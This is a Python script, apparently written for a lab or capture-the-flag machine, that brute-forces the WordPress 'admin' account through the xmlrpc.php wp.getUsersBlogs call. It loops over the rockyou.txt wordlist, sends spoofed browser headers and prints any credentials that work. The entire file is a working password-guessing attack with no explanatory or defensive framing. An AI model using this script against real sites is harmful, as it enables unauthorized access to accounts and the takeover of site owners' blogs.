#!/usr/bin/python
#coding: utf-8

import requests
import re
import threading
import os
from pwn import *
import signal
import sys

hilos = 50

def def_handler(sig, frame):
	log.failure("Exit...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def makeRequest(username, password):

	url = 'http://10.10.117.219/blog/xmlrpc.php'

	header = {
		'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language': 'en-US,en;q=0.5',
		'Accept-Encoding': 'gzip, deflate',
		'Connection': 'close',
		'Upgrade-Insecure-Requests': '1',
		'Cache-Control': 'max-age=0',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Content-Length': '194'
	}

	xml = """
		<methodCall>
			<methodName>wp.getUsersBlogs</methodName> 
			<param><value>%s</value></param>
			<param><value>%s</value></param>
		</methodCall>
	""" % (username, password)

	r = requests.post(url, headers=header, data=xml).text
	if "Incorrect username or password" not in r:
		print("[*] Credenciales válidas %s:%s" % (username, password))

if __name__ == '__main__':

	threads = []

	top = hilos
	counter = 1

	por_hilos = 0

	p1 = log.progress("Buscando contraseña...")
	p2 = log.progress("Probando...")

	users = ['admin']
	contrasenas = open("/usr/share/wordlists/rockyou.txt", 'r')

	for password in contrasenas:
		for user in users:
			if por_hilos:
				try:
					p1.status('%s:%s' % (user, password))
					thread = threading.Thread(target=makeRequest, args=(user, password))
					threads.append(thread)
					thread.start()
					counter += 1
					if counter == top:
						van = top/2
						p1.status("%d" % van)
						top += hilos
						time.sleep(3)
				except Exception as e:
					log.error(str(e))
			else:
				p1.status('%s:%s' % (user, password))
				makeRequest(user,password)
